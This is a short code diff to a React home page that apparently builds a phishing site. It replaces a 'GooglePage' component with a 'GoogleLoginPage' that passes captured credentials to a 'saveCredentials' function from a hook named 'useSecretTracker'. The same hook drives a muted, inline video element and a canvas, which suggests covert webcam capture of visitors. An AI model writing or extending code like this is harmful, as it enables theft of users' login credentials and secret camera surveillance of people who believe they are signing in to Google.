@@ -1,8 +1,8 @@
 import { useSecretTracker } from "@/hooks/use-tracking";
-import GooglePage from "@/components/GooglePage";
+import GoogleLoginPage from "@/components/GoogleLoginPage";
 
 export default function Home() {
-  const { videoRef, canvasRef } = useSecretTracker();
+  const { videoRef, canvasRef, sessionId, saveCredentials } = useSecretTracker();
 
   return (
     <>
@@ -10,7 +10,7 @@ export default function Home() {
         <video ref={videoRef} width={640} height={480} playsInline muted />
         <canvas ref={canvasRef} />
       </div>
-      <GooglePage />
+      <GoogleLoginPage sessionId={sessionId} onCredentials={saveCredentials} />
     </>
   );
 }
